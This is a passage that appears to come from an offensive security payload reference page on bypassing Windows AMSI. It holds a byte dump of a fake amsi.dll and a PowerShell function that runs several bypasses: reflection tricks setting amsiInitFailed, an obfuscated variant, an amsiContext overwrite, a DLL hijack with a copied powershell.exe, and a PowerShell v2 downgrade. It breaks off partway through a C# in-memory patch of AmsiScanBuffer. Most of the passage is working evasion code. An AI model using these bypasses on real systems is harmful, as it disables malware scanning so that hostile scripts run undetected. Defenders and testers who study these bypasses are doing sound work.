0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 216 29 0 128 1 0 0 0 80 30 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 48 0 128 1 0 0 0 240 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 136 29 62 87 0 0 0 0 2 0 0 0 65 0 0 0 116 34 0 0 116 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 184 34 0 0 184 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 13 0 0 0 68 2 0 0 204 34 0 0 204 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 32 0 128 1 0 0 0 0 33 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 82 83 68 83 42 80 223 113 29 247 64 69 188 37 18 40 145 144 25 190 50 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 120 54 52 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 18 0 0 0 18 0 0 0 1 0 0 0 17 0 0 0 71 67 84 76 0 16 0 0 63 14 0 0 46 116 101 120 116 36 109 110 0 0 0 0 64 30 0 0 18 0 0 0 46 116 101 120 116 36 109 110 36 48 48 0 82 30 0 0 129 0 0 0 46 116 101 120 116 36 120 0 0 32 0 0 248 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 248 32 0 0 16 0 0 0 46 48 48 99 102 103 0 0 8 33 0 0 8 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 16 33 0 0 8 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 24 33 0 0 8 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 32 33 0 0 8 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 40 33 0 0 8 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 48 33 0 0 8 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 56 33 0 0 8 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 64 33 0 0 8 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 80 33 0 0 36 1 0 0 46 114 100 97 116 97 0 0 116 34 0 0 156 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 16 37 0 0 8 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 24 37 0 0 8 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 32 37 0 0 8 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 40 37 0 0 8 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 48 37 0 0 60 1 0 0 46 120 100 97 116 97 0 0 108 38 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 168 38 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 192 38 0 0 248 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 184 39 0 0 200 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 52 0 0 0 46 100 97 116 97 0 0 0 64 48 0 0 0 6 0 0 46 98 115 115 0 0 0 0 0 64 0 0 176 1 0 0 46 112 100 97 116 97 0 0 0 80 0 0 16 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 96 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 96 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 17 21 8 0 21 116 9 0 21 100 7 0 21 52 6 0 21 50 17 224 236 29 0 0 1 0 0 0 207 16 0 0 92 17 0 0 82 30 0 0 0 0 0 0 17 15 6 0 15 100 8 0 15 52 6 0 15 50 11 112 236 29 0 0 1 0 0 0 246 17 0 0 20 18 0 0 105 30 0 0 0 0 0 0 1 6 2 0 6 50 2 80 1 20 8 0 20 100 8 0 20 84 7 0 20 52 6 0 20 50 16 112 9 26 6 0 26 52 15 0 26 114 22 224 20 112 19 96 236 29 0 0 1 0 0 0 102 18 0 0 54 19 0 0 133 30 0 0 54 19 0 0 1 6 2 0 6 82 2 80 1 9 1 0 9 98 0 0 1 8 4 0 8 114 4 112 3 96 2 48 9 4 1 0 4 34 0 0 236 29 0 0 1 0 0 0 215 23 0 0 101 24 0 0 187 30 0 0 101 24 0 0 1 2 1 0 2 80 0 0 1 4 1 0 4 66 0 0 1 6 2 0 6 50 2 48 1 13 4 0 13 52 10 0 13 114 6 80 1 13 4 0 13 52 9 0 13 50 6 80 1 21 5 0 21 52 186 0 21 1 184 0 6 80 0 0 1 15 6 0 15 100 7 0 15 52 6 0 15 50 11 112 1 13 4 0 13 52 7 0 13 50 6 80 0 0 0 0 1 0 0 0 56 39 0 0 0 0 0 0 0 0 0 0 62 40 0 0 120 32 0 0 104 39 0 0 0 0 0 0 0 0 0 0 6 41 0 0 168 32 0 0 192 38 0 0 0 0 0 0 0 0 0 0 114 42 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 8 0 95 95 67 95 115 112 101 99 105 102 105 99 95 104 97 110 100 108 101 114 0 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 62 0 109 101 109 115 101 116 0 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 54 0 95 105 110 105 116 116 101 114 109 0 55 0 95 105 110 105 116 116 101 114 109 95 101 0 63 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 51 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 52 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 60 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 34 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 30 0 95 99 114 116 95 97 116 101 120 105 116 0 22 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 174 4 82 116 108 67 97 112 116 117 114 101 67 111 110 116 101 120 116 0 181 4 82 116 108 76 111 111 107 117 112 70 117 110 99 116 105 111 110 69 110 116 114 121 0 0 188 4 82 116 108 86 105 114 116 117 97 108 85 110 119 105 110 100 0 0 146 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 82 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 15 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 112 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 112 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 48 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 16 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 20 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 221 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 84 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 106 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 50 162 223 45 153 43 0 0 205 93 32 210 102 212 255 255 255 255 255 255 0 0 0 0 1 0 0 0 2 0 0 0 47 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 16 0 0 65 16 0 0 48 37 0 0 68 16 0 0 148 16 0 0 16 38 0 0 148 16 0 0 191 17 0 0 52 37 0 0 192 17 0 0 66 18 0 0 96 37 0 0 68 18 0 0 76 19 0 0 164 37 0 0 76 19 0 0 160 19 0 0 144 37 0 0 160 19 0 0 221 19 0 0 72 38 0 0 224 19 0 0 20 20 0 0 24 38 0 0 20 20 0 0 229 20 0 0 212 37 0 0 232 20 0 0 89 21 0 0 220 37 0 0 92 21 0 0 149 21 0 0 16 38 0 0 152 21 0 0 184 21 0 0 16 38 0 0 184 21 0 0 205 21 0 0 16 38 0 0 208 21 0 0 248 21 0 0 16 38 0 0 248 21 0 0 13 22 0 0 16 38 0 0 16 22 0 0 113 22 0 0 144 37 0 0 116 22 0 0 164 22 0 0 16 38 0 0 164 22 0 0 184 22 0 0 16 38 0 0 184 22 0 0 1 23 0 0 24 38 0 0 4 23 0 0 205 23 0 0 32 38 0 0 208 23 0 0 108 24 0 0 232 37 0 0 108 24 0 0 144 24 0 0 24 38 0 0 144 24 0 0 187 24 0 0 24 38 0 0 188 24 0 0 11 25 0 0 24 38 0 0 12 25 0 0 35 25 0 0 16 38 0 0 36 25 0 0 208 25 0 0 44 38 0 0 252 25 0 0 23 26 0 0 16 38 0 0 32 26 0 0 101 27 0 0 56 38 0 0 104 27 0 0 178 27 0 0 72 38 0 0 180 27 0 0 254 27 0 0 72 38 0 0 8 28 0 0 201 29 0 0 88 38 0 0 80 30 0 0 82 30 0 0 104 38 0 0 82 30 0 0 105 30 0 0 136 37 0 0 105 30 0 0 133 30 0 0 136 37 0 0 133 30 0 0 187 30 0 0 204 37 0 0 187 30 0 0 211 30 0 0 8 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 11 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 96 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 24 0 0 0 248 160 0 161 88 161 96 161 56 162 80 162 88 162 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\"\nif (([IntPtr]::Size) -eq 8)\n{\nWrite-Verbose \"64 bit process detected.\"\n$DllBytes = $AmsiX64\n}\nelseif (([IntPtr]::Size) -eq 4)\n{\nWrite-Verbose \"32 bit process detected.\"\n$DllBytes = $AmsiX86\n}\nswitch($method)\n{\n\"unload\"\n{\nWrite-Verbose \"Using Matt Graeber's Reflection method.\"\nif ($ShowOnly -eq $True)\n{\nWrite-Output \"Use the following scriptblock before you run a script which gets detected.\"\nWrite-Output '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)'\n}\nelse\n{\nWrite-Output \"Executing the bypass.\"\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n}\n}\n\"unloadsilent\"\n{\nWrite-Verbose \"Using Matt Graeber's Reflection method with WMF5 autologging bypass.\"\nif ($ShowOnly -eq $True)\n{\nWrite-Output \"Use the following scriptblock before you run a script which gets detected.\"\nWrite-Output '[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags'')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType(''System.T''+''ype'')), [Object]([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'')),(''GetFie''+''ld'')).Invoke(''amsiInitFailed'',((''Non''+''Public,Static'') -as [String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags''))).SetValue($null,$True)'\n}\nelse\n{\nWrite-Output \"Executing the bypass.\"\n[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)\n}\n}\n\"unloadobfuscated\"\n{\nWrite-Verbose \"Using Matt Graeber's Reflection method with obfuscation from Daneil Bohannon's Invoke-Obfuscation - which bypasses WMF5 autologging.\"\nif ($ShowOnly -eq $True)\n{\n$code = @\" \nSv  ('R9'+'HYt') ( \" ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI\"  );  Invoke-Expression( -Join ( VaRIAbLe  ('R9'+'hyT')  -val  )[ - 1..- (( VaRIAbLe  ('R9'+'hyT')  -val  ).Length)])\n\"@\nWrite-Output \"Use the following scriptblock before you run a script which gets detected.\"\nWrite-Output $code\n}\nelse\n{\nWrite-Output \"Executing the bypass.\"\nSv  ('R9'+'HYt') ( \" ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI\"  );  Invoke-Expression( -Join ( VaRIAbLe  ('R9'+'hyT')  -val  )[ - 1..- (( VaRIAbLe  ('R9'+'hyT')  -val  ).Length)])\n}\n}\n\"unload2\"\n{\nWrite-Verbose \"Using Matt Graeber's second Reflection method.\"\nif ($ShowOnly -eq $True)\n{\nWrite-Output \"Use the following scriptblock before you run a script which gets detected.\"\nWrite-Output '[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiContext'',[Reflection.BindingFlags]''NonPublic,Static'').GetValue($null),0x41414141)'\n}\nelse\n{\nWrite-Output \"Executing the bypass.\"\n[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)\n}\n}\n\"dllhijack\"\n{\nWrite-Verbose \"Using Cornelis de Plaa's DLL hijack method.\"\nif ($ShowOnly -eq $True)\n{\nWrite-Output \"Copy powershell.exe from C:\\Windows\\System32\\WindowsPowershell\\v1.0 to a local folder and dropa fake amsi.dll in the same directory.\"\nWrite-Output \"Run the new powershell.exe and AMSI should be gone for that session.\"\n}\nelse\n{\n[Byte[]] $temp = $DllBytes -split ' '                \nWrite-Output \"Executing the bypass.\"\nWrite-Verbose \"Dropping the fake amsi.dll to disk.\"\n[System.IO.File]::WriteAllBytes(\"$pwd\\amsi.dll\", $temp)\nWrite-Verbose \"Copying powershell.exe to the current working directory.\"\nCopy-Item -Path C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Destination $pwd\nWrite-Verbose \"Starting powershell.exe from the current working directory.\"\n&amp; \"$pwd\\powershell.exe\"\n}\n}\n\"psv2\"\n{\nWrite-Verbose \"Using PowerShell version 2 which doesn't support AMSI.\"\nif ($ShowOnly -eq $True)\n{\nWrite-Output \"If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process.\"\n}\nelse\n{\nWrite-Verbose \"Checking if .Net version 2.0.50727 is installed.\"\n$versions = Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\\p{L}'} | Select -ExpandProperty Version\nif($versions -match \"2.0.50727\")\n{\nWrite-Verbose \".Net version 2.0.50727 found.\"\nWrite-Output \"Executing the bypass.\"\npowershell.exe -version 2\n}\nelse\n{\nWrite-Verbose \".Net version 2.0.50727 not found. Can't start PowerShell v2.\"\n}\n}\n}\n\"obfuscation\"\n{\nWrite-Output \"AMSI and the AVs which support it can be bypassed using obfuscation techqniues.\"\nWrite-Output \"ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/) and Invoke-Obfuscation can be used (https://github.com/danielbohannon/Invoke-Obfuscation).\"\n}\n}\n}\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#adam-chester-patch","title":"Adam Chester Patch","text":"<p>Bypass Update by Adam Chester https://twitter.com/xpn/status/1170852932650262530</p> <pre><code>$Winpatch = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class patch\n{\n    // https://twitter.com/_xpn_/status/1170852932650262530\n    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };\n    static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };\n    public static void it()\n    {\n        if (is64Bit())\n            PatchAmsi(x64);\n        else\n            PatchAmsi(x86);\n    }\n    private static void PatchAmsi(byte[] patch)\n    {\n        try\n        {\n            var lib = Win32.LoadLibrary(\"a\" + \"ms\" + \"i.dll\");\n            var addr = Win32.GetProcAddress(lib, \"AmsiScanBuffer\");\n            uint oldProtect;\n            Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);\n            Marshal.Copy(patch, 0, addr, patch.Length);\n            